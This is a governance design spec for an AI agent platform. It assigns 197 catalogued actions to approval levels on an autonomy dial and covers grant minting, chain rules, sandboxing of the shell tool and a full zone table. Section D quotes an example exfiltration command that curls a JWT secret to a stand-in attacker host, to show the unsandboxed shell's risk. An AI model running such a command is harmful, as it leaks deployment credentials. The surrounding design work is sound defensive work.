**Rule: a workflow approval step MUST mint (or consume) the corresponding
ledger grant.** One approval system observed from two places, never two
systems. Concretely: `WaitForDeploymentApprovalActivity` and
`MergeApprovalWorkflow`'s human step record their yes as a
correlation-standing grant for the action(s) the approved intent implies, so
the seams downstream of the approval honour it. This is a NEW acceptance
criterion for the implementation, and it is what makes the level table
shippable at dial 70 without breaking the main path.

Two supporting facts, verified: Seam C resolves correlation from header
`X-Tamma-Correlation-Id` → query → route-fallback and never the body
(`GovernanceEnforcement.cs:394-439`), while every engine mediation call
carries its correlation in the body only — and each sub-workflow sends its
OWN instance id, not the cycle id. So no chain except deploy's Seam E has a
ledger-visible shared correlation today. **The cycle instance id must be
threaded as the header on mediation calls** (`TammaApiClient`), or
correlation-standing grants have nothing to attach to.

### C. Chain rules (from the verified chain map)

1. **Monotonicity:** no gated link in a chain may carry a level above its
   chain's entry approval unless it has its own resumable human wait.
   Verified violation shapes: post-approval tails that can independently 409
   after a person said yes (deploy → release), and deny-only tails (Seam D
   outbox senders) above human-initiated heads, which wedge queues with no
   escalation path by design.
2. **Sagas are approved at entry for the whole correlation:** deploy tail,
   secret rotation (already the best-plumbed: `rot_{guid}` minted at entry,
   threaded into the deferred retire), tenant move, tenant delete, and the
   merge composite (merge → issue close → branch delete).
3. **`git.branch.delete` at 90 governs the wrong member:** the main chain's
   deletion rides the merge composite; the standalone route the level was
   attached to is not on any chain. The 90 belongs to the standalone
   destructive route; the in-composite deletion is covered by the merge
   approval's grant.
4. **Gate intent, not execution:** the level attaches where intent forms
   (enqueue, dispatch); executor seams (outbox senders) are deny-only
   backstops for policy that changed between enqueue and send, and must
   never be the primary gate — otherwise one notification is approved twice
   and a wedged queue is unrecoverable.

### D. OQ1 answered: `shell_execute`'s level is a property of the EXECUTOR, not the argument

Verified: the tool executes an arbitrary `/bin/bash -c` string with the API
process's **entire inherited environment** — `ProcessStartInfo` sets no
`EnvironmentVariables` (`ShellExecuteTool.cs:86-94`), so the child sees
GITHUB_TOKEN, JWT_SECRET and the DB credentials — with no network
restriction, no sandbox, no allowlist, and an 18-pattern **denylist**
(`CommandValidator.cs:16-59`). `ls` and `curl -d "$JWT_SECRET" evil.com` are
the same action at the same level.

Argument grading is NOT implementable today: a denylist is an allow/deny
screen, not a level classifier, and unlike git there is no bounded verb set
to grade. So:

- **80 is the honest default** — it prices "arbitrary shell holding the
  deployment's secrets", which is what ships.
- **A sandboxed executor profile earns a lower level** (~40): child env
  stripped to an explicit set (a one-line `psi.EnvironmentVariables` change),
  egress blocked, CWD confined. The level is config-dependent because the
  risk is config-dependent.
- With A's correlation-standing grants, dial-70 UX at shell-80 is ONE
  approval per run, not tens. That is the resolution of the first-run
  friction, not a lowered level.
- Same treatment for its twin `effect:process.spawn` (same executor).
- `git_operations`' read/write split stays, with its documented holes
  (`log --output=FILE`, `branch -D` survive the Read grade) carried as known,
  not fixed here.

### E. Toggle encoding: store the CHOICE, not an inequality against a moving value

The specced encoding (row at `min_autonomy = dial-at-mint`) was state-machined
and fails the product rule twice: a later dial DROP below the mint value
silently kills the toggle while the UI badge (keyed on row presence) still
shows ON; a dial return silently resurrects it, path-dependently. Verified
additionally: group-scope rows bypass level ownership in both directions as
the resolver is built, and DELETE does not fall back to the shipped level
when a group row exists.

**Fix: a toggle is stored as `min_autonomy = AutonomyDial.Min`** — "automated,
period" — so the row's meaning is a constant function of the dial. Zero
schema change, zero resolver change. Mint-time dial provenance goes in the
audit event, not the arithmetic. Lowering the dial then leaves toggles
standing **visibly**: the dial-lower flow enumerates surviving toggles and
offers bulk revoke, so "less automation please" is an explicit review, not a
silent side-effect. The `levelOwned`/409 predicate must key on what the
ladder WITHOUT the action row resolves (group rows and ceiling included),
not on the shipped level alone.

### F. The "at 100" escape hatch is currently one document type wide — say so, then widen it

Verified: the ambiguity comparison lives in one place
(`DocumentLifecycleHelper.IsAmbiguityAboveThreshold`), and its threaded-score
leg is DEAD — all 14 lifecycle dispatchers pass no `ambiguityScore`, so the
only type ever scored is `ambiguity-assessment` itself. No-agreement exists
only where a panel is configured (and works: split decision, below-quorum,
empty panel, Critical veto → `review-undecidable` escalation). Tool and
effect paths have no content signal at all beyond the denylist.

So the product rule "at 100, only ambiguity or no-agreement pull in a
person" is one wired type away from being false advertising. New ACs:

- The assessment family's score is threaded into downstream lifecycle
  dispatches (the input exists on the lifecycle; nobody passes it).
- The coverage map (family × signal) ships in the story so the gap is a
  table, not a surprise: documents = both signals where configured; effects
  = classification only, stated honestly.

### G. Acceptance unification (form α): the shipped floor becomes DERIVED

After this story the two systems become unsatisfiable together — the catalog
says "design automates at 80" while `AcceptanceDefaults` says "a person at
every level", and the lockstep test fails by construction. Doing nothing is
not an option.

Adopt form α: **the shipped acceptor floor is derived from (doc-type action
level vs dial)**; the stored per-type `AcceptorRequirement` remains ONLY as
the named-type override, preserving the pinned semantics (an explicit
per-type `any` still lowers; a base-row PUT still cannot erase the floor).
One caveat is load-bearing: "the dial" in the derivation is the BASE row's
`AutonomyLevel` (`AutonomyGateEvaluator.cs:196`), never a per-type row's own
level — otherwise a per-type autonomy edit silently moves that type's
acceptor. Full deletion of the field (form β) waits until the toggle surface
has proven itself.

### H. Evidence-driven levels: the telemetry to make the next review empirical

Verified gaps: the `.ALLOWED` volume gate drops exactly the count needed
(SystemDefault provenance = no row, which today is ~everything); Seam B
writes NO decision events (log-only trail); there is no
`Tags->>'actionKey'` index; and `action_authorizations` is structurally
empty until something is gated (chicken-and-egg). But per-effect counts
already exist for 7 of the 9 moved actions via the mediation event families
(`GIT.PR_MERGED.*`, `AGENT_DISPATCH.RUN_TRIGGERED.*`, outbox rows), and Seam
A observes every named agent-action without blocking — a free shadow channel
the moment agent-actions carry real levels.

New ACs: a count-only `.ALLOWED` emission (or sampled) so allowed volume is
measurable; Seam B decision events; the actionKey expression index; and the
dial UI as **detents with a diff preview** — "raising 70→75 automates: [6
actions, with their last-30-day fire counts and approve rates]" — computed
from the grant table and the effect families. The preview is the informed
consent mechanism; a smooth slider over 13 meaningful positions is false UI.

### Supersessions

- **OQ1** (shell at 80): answered in D — 80 default, config-dependent
  reduction, correlation-standing grant UX.
- **OQ6** (group rows re-open level-owned actions): confirmed true as built;
  E's `levelOwned` predicate change closes it rather than documenting it.
- **M-table row for `git.branch.delete`**: split per C3.
- The "9 newly-gated breakages" framing: with B and A in place, the merge
  and deploy rows are NOT breakages (their human approvals mint grants), and
  shell is one-ask-per-run. The residual genuine behaviour changes at dial
  70 are the notification enqueues and `agent-dispatch.run` — both
  once-per-task-or-less, both honest gates.

| Date       | Version | Changes                                        | Author |
| ---------- | ------- | ---------------------------------------------- | ------ |
| 2026-08-01 | 1.1.0   | Depth pass: approval scopes, chain rules, shell resolution, toggle encoding, signal coverage, unification α, telemetry ACs | Claude |

### The dial, position by position — what each level unlocks

The inverse of the assignment table: the 13 detents. "Unlocks" = becomes
orchestrator-approved (the acceptance step still runs; a person stops being
the approver). Cumulative: at dial N everything at ≤N is automated.


**Level 10** — unlocks 44 (44 of 197 automated at dial 10):

- agent-action: `analyze-assessment-response`, `analyze-security-incident`, `assess-capacity`, `assess-technical-risk`, `assess-vulnerability`, `audit-accessibility`, `audit-dependencies`, `clarify-requirements`, `context-scan`, `coordinate-release`, `create-tasks`, `debug-rootcause`, `decompose-issue`, `define-acceptance-criteria`, `diagnose-incident`, `facilitate-retro`, `generate-assessment-questions`, `incident-rootcause`, `manage-regression`, `monitor-health`, `plan-debugging`, `plan-incident-response`, `plan-roadmap`, `plan-scope`, `plan-test-strategy`, `prioritize-backlog`, `research`, `resolve-blocker`, `score-ambiguity`, `threat-model`, `track-impediments`, `triage-context-scan`, `triage-defect`, `triage-intake`, `triage-pr`, `triage-tech-debt`, `triage-technical`
- automation: `action-catalog-startup-validator`, `governance-policy-snapshot-priming-service`, `provider-settings-store-priming-service`
- tool: `file_read`, `get_acceptance_rules`, `git_operations.read`, `search_code`

**Level 20** — unlocks 3 (47 of 197 automated at dial 20):

- agent-action: `audit-secrets`, `plan-deployment`
- effect: `secret.reveal`

**Level 30** — unlocks 52 (99 of 197 automated at dial 30):

- agent-action: `report-status`, `summarize-changes`, `summarize-stakeholder`, `summarize-technical`, `synthesize-standup`, `update-changelog`, `write-adr`, `write-api-docs`, `write-postmortem`, `write-release-notes`, `write-retro-narrative`, `write-runbook`, `write-user-docs`
- automation: `agent-seeder`, `alert-rule-evaluator`, `audit-chain-checkpoint-scheduler`, `audit-projector`, `built-in-alert-rule-seeder`, `channel-outbox-sweeper`, `convention-store-seeder`, `engine-registry-heartbeat-service`, `entitlement-cache-invalidation-listener`, `hourly-analytics-rollup-scheduler`, `notification-dispatcher`, `platform-task-worker`, `pool-warmup-service`, `provider-session-cleanup-service`, `reveal-token-sweeper`, `task-queue-processor`, `tenant-scheduled-trigger-service`, `tenant-status-invalidation-listener`, `workflow-seeder`, `workflow-sync-service`
- effect: `engine.channel-outbox.enqueue`, `engine.document.persist`, `engine.document.set-status`, `mentorship.session.pause`, `mentorship.session.resume`, `schedule.create`, `schedule.delete`, `schedule.update`, `tracker.preferences.delete`, `tracker.preferences.set`, `tracker.project.create`, `tracker.project.update`, `tracker.work-item.assign`, `tracker.work-item.create`, `tracker.work-item.set-status`, `tracker.work-item.update`
- platform-task: `billing.webhook.followup`, `plan.activate_scheduled`
- tool: `file_write`

**Level 45** — unlocks 26 (125 of 197 automated at dial 45):

- agent-action: `address-review-comments`, `author-ui-spec`, `debug`, `design-api-contract`, `design-data-model`, `design-integration`, `design-system`, `draft-user-flow`, `implement-feature`, `implement-fix`, `implement-infrastructure`, `incorporate-answers`, `plan-fix`, `plan-implementation`, `plan-migration-strategy`, `plan-refactor`, `plan-sprint`, `plan-system-design`, `propose-design`, `refactor`, `write-regression-test`, `write-test-cases`, `write-tests`
- effect: `engine.events.append`, `engine.platform-events.append`, `llm.call`

**Level 50** — unlocks 3 (128 of 197 automated at dial 50):

- agent-action: `exploratory-test`
- effect: `ci.tests.trigger`
- tool: `run_tests`

**Level 55** — unlocks 27 (155 of 197 automated at dial 55):

- agent-action: `code-review`, `code-review-architecture`, `code-review-coverage`, `code-review-security`, `mentor-feedback`, `plan-review`, `plan-review-security`, `review-acceptance`, `review-compliance`, `review-design`, `review-docs`, `review-feasibility`, `review-operability`, `review-scope`, `review-testability`, `self-review`, `verify-acceptance`
- document-type: `ambiguity-assessment`, `backlog-ordering`, `clarification`, `decomposition`, `diagnosis`, `findings`, `prose`, `test-plan`, `test-spec`, `triage-decision`

**Level 60** — unlocks 4 (159 of 197 automated at dial 60):

- document-type: `acceptance-criteria`, `plan`, `review`, `ux-spec`

**Level 65** — unlocks 12 (171 of 197 automated at dial 65):

- automation: `retire-sweep`, `secret-auto-rotation-scheduler`
- effect: `git.branch.create`, `git.issue.patch`, `git.pull-request.create`, `git.release.create`, `jira.ticket.patch`
- platform-task: `RETIRE_SECRET_VERSION`, `billing.customer.create`, `provisioning.tenant`, `provisioning.tenant.v2`
- tool: `git_operations.write`

**Level 75** — unlocks 7 (178 of 197 automated at dial 75):

- automation: `outbox-slack-sender`, `outbox-smtp-sender`
- effect: `git.pull-request.merge`, `notify.email.send`, `notify.slack.queue`, `tracker.project.delete`, `tracker.work-item.delete`

**Level 80** — unlocks 8 (186 of 197 automated at dial 80):

- agent-action: `configure-cicd`
- document-type: `design`
- effect: `agent-dispatch.run`, `mcp.tool.invoke`, `mentorship.session.start`, `process.spawn`
- platform-task: `tenant.move`
- tool: `shell_execute`

**Level 85** — unlocks 1 (187 of 197 automated at dial 85):

- document-type: `sprint-plan`

**Level 90** — unlocks 3 (190 of 197 automated at dial 90):

- document-type: `threat-model`
- effect: `git.branch.delete`, `mentorship.session.cancel`

**Level 95** — unlocks 7 (197 of 197 automated at dial 95):

- agent-action: `deploy`, `rollback`
- automation: `tenant-cleanup-requested-trigger`, `tenant-delete-requested-trigger`
- effect: `deploy.promote-prod`, `deploy.rollback`
- platform-task: `provisioning.tenant.deprovision`
---

## Amendment 3 — 2026-08-01: ZONES (product owner). Supersedes the containment bands and the empty-96-100 rule

The product owner replaced the derived bands with named capability zones, in
this order, at 5-point steps. 95-100 is VALID and holds the most dangerous
actions (deletes). At dial 100 everything still automates (level <= dial).
Merge and deploy each span several levels by TARGET importance.

| Level | Zone | What sits there |
|---|---|---|
| 5 | Read-only | analysis, research, triage, read tools (`file_read`, `search_code`, `git_operations.read`) |
| 10 | Sensitive reads | `audit-secrets`, `secret.reveal` |
| 15 | Write documentation | docs, changelogs, ADR prose, status reports |
| 20 | Write own records | Tamma tracker items, projects, schedules, housekeeping jobs |
| 25 | Write code on a branch | `implement-*`, `refactor`, `write-tests`, `file_write` (workspace) |
| 30 | Run tests | `run_tests`, `ci.tests.trigger`, `exploratory-test` |
| 35 | Create branch / create PR | `git.branch.create`, `git.pull-request.create`, `release.create` (draft surface) |
| 40 | Approve PRs / routine docs | `code-review*`, `review-*`, routine document acceptances |
| 45 | Approve binding docs | `plan`, `acceptance-criteria`, `design`, `sprint-plan`, `threat-model` acceptances |
| 50 | Bypass PR checks | **no catalog action exists — must be minted** |
| 55 | Merge to dev trunk | merge, target = dev |
| 60 | Merge to qa trunk | merge, target = qa |
| 65 | Merge to main | merge, target = main |
| 70 | Deploy to dev | **default dial sits here** |
| 75 | Deploy to qa; external messages | `notify.slack.*`, `notify.email.*` + outbox senders |
| 80 | Deploy to uat; unbounded execution | `shell_execute` (unsandboxed), `process.spawn`, `agent-dispatch.run`, `mcp.tool.invoke` |
| 85 | Deploy to staging; create infrastructure | tenant/app provisioning, `billing.customer.create` |
| 90 | Deploy to prod; manage secrets | `deploy.promote-prod`, secret rotation/retire |
| 95 | Delete branch / delete PR / rollback | `git.branch.delete`, PR deletion, `deploy.rollback` |
| 100 | Delete resources / infrastructure | tenant teardown, `provisioning.tenant.deprovision`, tenant move |

Consequences for the implementation:

1. **Per-target actions.** One `merge` action cannot carry three levels. The
   catalog splits by target: `git.merge.dev` / `git.merge.qa` / `git.merge.main`
   (target read from the PR base branch), and deploy per environment
   (`deploy.dev|qa|uat|staging|prod`) - the pipeline already has the stages;
   the catalog keys follow them. Same for delete where target matters.
2. **`bypass-pr-checks` is a new action** (level 50). Nothing in the tree
   performs it today; minting the key reserves the slot before anything does.
3. **95-100 empty is DEAD.** Deletes live there. The earlier reasoning
   ("an action at 99 is always-human in disguise") is answered by the rule
   itself: a tenant that wants automated deletes sets the dial there, and at
   100 everything runs.
4. **Amendment 2's mechanics survive** (approval scopes, grant minting from
   workflow approvals, toggle encoding, signal coverage, shell sandbox note);
   only its level NUMBERS and the reserved-band rule are superseded.
5. The full 197-row remap onto zones is the implementation table; rows above
   list the anchors. Actions the ladder does not name (LLM call, event
   appends, KB writes) keep their Amendment-1 relative order inside the
   nearest zone below 50.

| Date       | Version | Changes                                  | Author |
| ---------- | ------- | ---------------------------------------- | ------ |
| 2026-08-01 | 1.2.0   | Product-owner zone model at 5-point steps; per-target merge/deploy; 95-100 in use; new bypass-pr-checks action | meywd + Claude |

## Zone assignment — full table (supersedes the M1 numbers)

All 197 catalogued actions, grouped by zone level. **Old** is the M1/M2
(Amendment 1) number; **Zone** is the Amendment-3 assignment. JUDGMENT marks
rows the zone rules did not decide; the note says why the nearest zone was
picked. Verified against `ActionCatalog.Descriptors.cs` (197 descriptors:
96 agent-action, 17 document-type, 8 tool, 39 effect, 29 automation,
8 platform-task — the file's own header comments say 35 effects and 27
automations; both are stale).

### Level 5 — Read-only (45)

| Action key | Old | Zone | Notes |
|---|---|---|---|
| `agent-action:analyze-assessment-response` | 10 | 5 | |
| `agent-action:analyze-security-incident` | 10 | 5 | |
| `agent-action:assess-capacity` | 10 | 5 | |
| `agent-action:assess-technical-risk` | 10 | 5 | |
| `agent-action:assess-vulnerability` | 10 | 5 | |
| `agent-action:audit-accessibility` | 10 | 5 | |
| `agent-action:audit-dependencies` | 10 | 5 | no secret material |
| `agent-action:clarify-requirements` | 10 | 5 | |
| `agent-action:context-scan` | 10 | 5 | |
| `agent-action:coordinate-release` | 10 | 5 | sequencing thought, not pipeline control |
| `agent-action:create-tasks` | 10 | 5 | |
| `agent-action:debug-rootcause` | 10 | 5 | |
| `agent-action:decompose-issue` | 10 | 5 | |
| `agent-action:define-acceptance-criteria` | 10 | 5 | |
| `agent-action:diagnose-incident` | 10 | 5 | |
| `agent-action:facilitate-retro` | 10 | 5 | |
| `agent-action:generate-assessment-questions` | 10 | 5 | |
| `agent-action:incident-rootcause` | 10 | 5 | |
| `agent-action:manage-regression` | 10 | 5 | |
| `agent-action:monitor-health` | 10 | 5 | |
| `agent-action:plan-debugging` | 10 | 5 | ordering thought, not a binding artifact |
| `agent-action:plan-deployment` | 20 | 5 | planning thought about production |
| `agent-action:plan-incident-response` | 10 | 5 | |
| `agent-action:plan-roadmap` | 10 | 5 | |
| `agent-action:plan-scope` | 10 | 5 | |
| `agent-action:plan-test-strategy` | 10 | 5 | |
| `agent-action:prioritize-backlog` | 10 | 5 | |
| `agent-action:research` | 10 | 5 | |
| `agent-action:resolve-blocker` | 10 | 5 | |
| `agent-action:score-ambiguity` | 10 | 5 | |
| `agent-action:threat-model` | 10 | 5 | the thinking; the acceptance sits at 45 |
| `agent-action:track-impediments` | 10 | 5 | |
| `agent-action:triage-context-scan` | 10 | 5 | |
| `agent-action:triage-defect` | 10 | 5 | |
| `agent-action:triage-intake` | 10 | 5 | legacy AlwaysEscalate floor still wins via max() |
| `agent-action:triage-pr` | 10 | 5 | |
| `agent-action:triage-tech-debt` | 10 | 5 | |
| `agent-action:triage-technical` | 10 | 5 | |
| `tool:file_read` | 10 | 5 | |
| `tool:get_acceptance_rules` | 10 | 5 | read tool |
| `tool:search_code` | 10 | 5 | |
| `tool:git_operations.read` | 10 | 5 | known hole: subcommand-only grading; args can mutate |
| `automation:action-catalog-startup-validator` | 10 | 5 | startup validator |
| `automation:governance-policy-snapshot-priming-service` | 10 | 5 | priming service |
| `automation:provider-settings-store-priming-service` | 10 | 5 | priming service |

### Level 10 — Sensitive reads (2)

| Action key | Old | Zone | Notes |
|---|---|---|---|
| `agent-action:audit-secrets` | 20 | 10 | |
| `effect:secret.reveal` | 20 | 10 | descriptor is `Enforceable=false` — the level is recorded, never enforced |

### Level 15 — Write documentation (13)

| Action key | Old | Zone | Notes |
|---|---|---|---|
| `agent-action:report-status` | 30 | 15 | |
| `agent-action:summarize-changes` | 30 | 15 | |
| `agent-action:summarize-stakeholder` | 30 | 15 | |
| `agent-action:summarize-technical` | 30 | 15 | |
| `agent-action:synthesize-standup` | 30 | 15 | |
| `agent-action:update-changelog` | 30 | 15 | |
| `agent-action:write-adr` | 30 | 15 | |
| `agent-action:write-api-docs` | 30 | 15 | |
| `agent-action:write-postmortem` | 30 | 15 | |
| `agent-action:write-release-notes` | 30 | 15 | |
| `agent-action:write-retro-narrative` | 30 | 15 | |
| `agent-action:write-runbook` | 30 | 15 | |
| `agent-action:write-user-docs` | 30 | 15 | |

### Level 20 — Write Tamma's own records (42)

| Action key | Old | Zone | Notes |
|---|---|---|---|
| `effect:engine.events.append` | 45 | 20 | internal, observe-only seam |
| `effect:engine.platform-events.append` | 45 | 20 | internal, observe-only seam |
| `effect:engine.document.persist` | 30 | 20 | |
| `effect:engine.document.set-status` | 30 | 20 | |
| `effect:llm.call` | 45 | 20 | internal, observe-only seam (Seam A never blocks) |
| `effect:schedule.create` | 30 | 20 | |
| `effect:schedule.update` | 30 | 20 | |
| `effect:schedule.delete` | 30 | 20 | |
| `effect:tracker.project.create` | 30 | 20 | |
| `effect:tracker.project.update` | 30 | 20 | |
| `effect:tracker.project.delete` | 75 | **95** | JUDGMENT->fixed: irreversible destroy of user work; deletes live at 95-100 per the model |
| `effect:tracker.work-item.create` | 30 | 20 | |
| `effect:tracker.work-item.update` | 30 | 20 | |
| `effect:tracker.work-item.delete` | 75 | **95** | JUDGMENT->fixed: irreversible destroy of user work; deletes live at 95-100 per the model |
| `effect:tracker.work-item.assign` | 30 | 20 | |
| `effect:tracker.work-item.set-status` | 30 | 20 | |
| `effect:tracker.preferences.set` | 30 | 20 | |
| `effect:tracker.preferences.delete` | 30 | 20 | |
| `effect:mentorship.session.start` | 80 | 20 | JUDGMENT — rule says session ops→20, but it launches an autonomous agent run, same consequence as `agent-dispatch.run` (80) |
| `effect:mentorship.session.pause` | 30 | 20 | |
| `effect:mentorship.session.resume` | 30 | 20 | |
| `effect:mentorship.session.cancel` | 90 | 20 | JUDGMENT — destructive (run abandoned); 95 arguable |
| `automation:agent-seeder` | 30 | 20 | |
| `automation:alert-rule-evaluator` | 30 | 20 | |
| `automation:audit-chain-checkpoint-scheduler` | 30 | 20 | |
| `automation:audit-projector` | 30 | 20 | |
| `automation:built-in-alert-rule-seeder` | 30 | 20 | |
| `automation:convention-store-seeder` | 30 | 20 | |
| `automation:engine-registry-heartbeat-service` | 30 | 20 | |
| `automation:entitlement-cache-invalidation-listener` | 30 | 20 | |
| `automation:hourly-analytics-rollup-scheduler` | 30 | 20 | |
| `automation:platform-task-worker` | 30 | 20 | dispatched tasks carry their own levels |
| `automation:pool-warmup-service` | 30 | 20 | |
| `automation:provider-session-cleanup-service` | 30 | 20 | |
| `automation:reveal-token-sweeper` | 30 | 20 | |
| `automation:task-queue-processor` | 30 | 20 | |
| `automation:tenant-scheduled-trigger-service` | 30 | 20 | dispatched workflows separately governed |
| `automation:tenant-status-invalidation-listener` | 30 | 20 | |
| `automation:workflow-seeder` | 30 | 20 | |
| `automation:workflow-sync-service` | 30 | 20 | |
| `platform-task:billing.webhook.followup` | 30 | 20 | |
| `platform-task:plan.activate_scheduled` | 30 | 20 | JUDGMENT — internal pricing record, nearest zone |

### Level 25 — Write code on a branch (24)

| Action key | Old | Zone | Notes |
|---|---|---|---|
| `agent-action:address-review-comments` | 45 | 25 | |
| `agent-action:author-ui-spec` | 45 | 25 | binding artifact — closer to code than prose |
| `agent-action:design-api-contract` | 45 | 25 | binding artifact |
| `agent-action:design-data-model` | 45 | 25 | binding artifact |
| `agent-action:design-integration` | 45 | 25 | binding artifact |
| `agent-action:design-system` | 45 | 25 | binding artifact |
| `agent-action:draft-user-flow` | 45 | 25 | binding artifact |
| `agent-action:implement-feature` | 45 | 25 | |
| `agent-action:implement-fix` | 45 | 25 | |
| `agent-action:implement-infrastructure` | 45 | 25 | IaC on a branch is code-write (43-3 D5.1); the deploy is gated separately |
| `agent-action:incorporate-answers` | 45 | 25 | edits the binding requirement artifact |
| `agent-action:plan-fix` | 45 | 25 | binding artifact |
| `agent-action:plan-implementation` | 45 | 25 | binding artifact |
| `agent-action:plan-migration-strategy` | 45 | 25 | binding artifact |
| `agent-action:plan-refactor` | 45 | 25 | binding artifact |
| `agent-action:plan-sprint` | 45 | 25 | authoring; the human-pinned acceptance sits at 45 |
| `agent-action:plan-system-design` | 45 | 25 | binding artifact |
| `agent-action:propose-design` | 45 | 25 | authoring; the human-pinned acceptance sits at 45 |
| `agent-action:refactor` | 45 | 25 | |
| `agent-action:write-regression-test` | 45 | 25 | |
| `agent-action:write-test-cases` | 45 | 25 | |
| `agent-action:write-tests` | 45 | 25 | |
| `tool:file_write` | 30 | 25 | |
| `tool:git_operations.write` | 65 | 25 | FLAG — includes `push`, which is visible off-box; 35 arguable |

### Level 30 — Run tests (4)

| Action key | Old | Zone | Notes |
|---|---|---|---|
| `agent-action:debug` | 45 | 30 | JUDGMENT — owner named "debug execution", but the catalog grades it code authoring ("fix through code changes"); 25 also fits |
| `agent-action:exploratory-test` | 50 | 30 | |
| `effect:ci.tests.trigger` | 50 | 30 | |
| `tool:run_tests` | 50 | 30 | |

### Level 35 — Create branch / PR (5)

| Action key | Old | Zone | Notes |
|---|---|---|---|
| `effect:git.branch.create` | 65 | 35 | |
| `effect:git.pull-request.create` | 65 | 35 | |
| `effect:git.release.create` | 65 | 35 | |
| `effect:git.issue.patch` | 65 | 35 | FLAG for owner — visible outside and recallable, but arguably external comms (75) |
| `effect:jira.ticket.patch` | 65 | 35 | FLAG for owner — same question as git.issue.patch |

### Level 40 — Approve PRs / routine docs (27)

| Action key | Old | Zone | Notes |
|---|---|---|---|
| `agent-action:code-review` | 55 | 40 | |
| `agent-action:code-review-architecture` | 55 | 40 | |
| `agent-action:code-review-coverage` | 55 | 40 | |
| `agent-action:code-review-security` | 55 | 40 | |
| `agent-action:mentor-feedback` | 55 | 40 | |
| `agent-action:plan-review` | 55 | 40 | |
| `agent-action:plan-review-security` | 55 | 40 | |
| `agent-action:review-acceptance` | 55 | 40 | |
| `agent-action:review-compliance` | 55 | 40 | |
| `agent-action:review-design` | 55 | 40 | |
| `agent-action:review-docs` | 55 | 40 | |
| `agent-action:review-feasibility` | 55 | 40 | |
| `agent-action:review-operability` | 55 | 40 | |
| `agent-action:review-scope` | 55 | 40 | |
| `agent-action:review-testability` | 55 | 40 | |
| `agent-action:self-review` | 55 | 40 | |
| `agent-action:verify-acceptance` | 55 | 40 | |
| `document-type:ambiguity-assessment` | 55 | 40 | |
| `document-type:backlog-ordering` | 55 | 40 | |
| `document-type:clarification` | 55 | 40 | |
| `document-type:decomposition` | 55 | 40 | |
| `document-type:diagnosis` | 55 | 40 | |
| `document-type:findings` | 55 | 40 | |
| `document-type:prose` | 55 | 40 | |
| `document-type:test-plan` | 55 | 40 | |
| `document-type:test-spec` | 55 | 40 | |
| `document-type:triage-decision` | 55 | 40 | |

### Level 45 — Approve binding docs (7)

| Action key | Old | Zone | Notes |
|---|---|---|---|
| `document-type:plan` | 60 | 45 | |
| `document-type:acceptance-criteria` | 60 | 45 | |
| `document-type:review` | 60 | 45 | |
| `document-type:ux-spec` | 60 | 45 | |
| `document-type:design` | 80 | 45 | FLAG — ships `AcceptorRequirement.Human` today; 45 automates it at dial ≥45 |
| `document-type:sprint-plan` | 85 | 45 | FLAG — same: shipped human-pinned |
| `document-type:threat-model` | 90 | 45 | FLAG — same: shipped human-pinned |

### Level 50 — Bypass PR checks (1)

| Action key | Old | Zone | Notes |
|---|---|---|---|
| `agent-action:configure-cicd` | 80 | 50 | JUDGMENT — editing pipeline config is the power to remove the checks; nearest zone |

`effect:git.checks.bypass` itself does not exist — see Missing actions.

### Levels 55 / 60 — Merge to dev / qa (0)

Empty until the per-target merge keys are minted — see Missing actions.

### Level 65 — Merge to main (1)

| Action key | Old | Zone | Notes |
|---|---|---|---|
| `effect:git.pull-request.merge` | 75 | 65 | JUDGMENT — one coarse key today; carries the worst target (main) until split into `git.merge.dev/qa/main` |

### Level 70 — Deploy to dev (0)

Empty until per-environment deploy keys are minted — see Missing actions.

### Level 75 — Deploy qa / external messages (7)

| Action key | Old | Zone | Notes |
|---|---|---|---|
| `effect:notify.slack.queue` | 75 | 75 | |
| `effect:notify.email.send` | 75 | 75 | |
| `automation:outbox-slack-sender` | 75 | 75 | |
| `automation:outbox-smtp-sender` | 75 | 75 | |
| `effect:engine.channel-outbox.enqueue` | 30 | 75 | JUDGMENT — enqueue becomes a sent message once the sweeper drains; same consequence as notify.slack.queue |
| `automation:channel-outbox-sweeper` | 30 | 75 | JUDGMENT — it is an outbox sender by function |
| `automation:notification-dispatcher` | 30 | 75 | JUDGMENT — delivers alerts through external channels (`IAlertChannel.SendAsync`) |

### Level 80 — Deploy uat / unbounded execution (4)

| Action key | Old | Zone | Notes |
|---|---|---|---|
| `tool:shell_execute` | 80 | 80 | |
| `effect:process.spawn` | 80 | 80 | |
| `effect:agent-dispatch.run` | 80 | 80 | |
| `effect:mcp.tool.invoke` | 80 | 80 | FLAG — ships AlwaysHuman by the 2026-07-30 governance reversal (no CI drift signal for MCP); a fixed 80 undoes that decision |

### Level 85 — Deploy staging / create infrastructure (3)

| Action key | Old | Zone | Notes |
|---|---|---|---|
| `platform-task:provisioning.tenant` | 65 | 85 | |
| `platform-task:provisioning.tenant.v2` | 65 | 85 | |
| `platform-task:billing.customer.create` | 65 | 85 | |

### Level 90 — Deploy prod / manage secrets (5)

| Action key | Old | Zone | Notes |
|---|---|---|---|
| `effect:deploy.promote-prod` | 95 | 90 | |
| `agent-action:deploy` | 95 | 90 | JUDGMENT — one coarse key spanning all environments; carries the worst (prod) until per-env split |
| `automation:secret-auto-rotation-scheduler` | 65 | 90 | |
| `automation:retire-sweep` | 65 | 90 | |
| `platform-task:RETIRE_SECRET_VERSION` | 65 | 90 | |

### Level 95 — Delete branch / rollback (3)

| Action key | Old | Zone | Notes |
|---|---|---|---|
| `effect:git.branch.delete` | 90 | 95 | |
| `effect:deploy.rollback` | 95 | 95 | |
| `agent-action:rollback` | 95 | 95 | |

### Level 100 — Delete resources / infrastructure (4)

| Action key | Old | Zone | Notes |
|---|---|---|---|
| `platform-task:provisioning.tenant.deprovision` | 95 | 100 | |
| `platform-task:tenant.move` | 80 | 100 | |
| `automation:tenant-cleanup-requested-trigger` | 95 | 100 | |
| `automation:tenant-delete-requested-trigger` | 95 | 100 | |

**Count check**: 45+2+13+42+24+4+5+27+7+1+1+7+4+3+5+3+4 = 197. Every
descriptor appears exactly once.

## Missing actions

Capabilities the ladder names, or the code performs, with no catalog key.
"Nothing yet" means reserve the key before anything performs it.

**Ladder slots with no key:**

| Proposed key | Zone | Performed today by |
|---|---|---|
| `effect:git.checks.bypass` | 50 | nothing yet — reserve the key |
| `effect:git.merge.dev` | 55 | `GitEndpoints.MergePullRequest` when the PR base is dev (coarse key today) |
| `effect:git.merge.qa` | 60 | same route, base = qa |
| `effect:git.merge.main` | 65 | same route, base = main; retire coarse `git.pull-request.merge` on split |
| `effect:deploy.dev` | 70 | `DeploymentPipelineWorkflow` dev stage (only the prod transition is catalogued) |
| `effect:deploy.qa` | 75 | qa stage |
| `effect:deploy.uat` | 80 | uat stage |
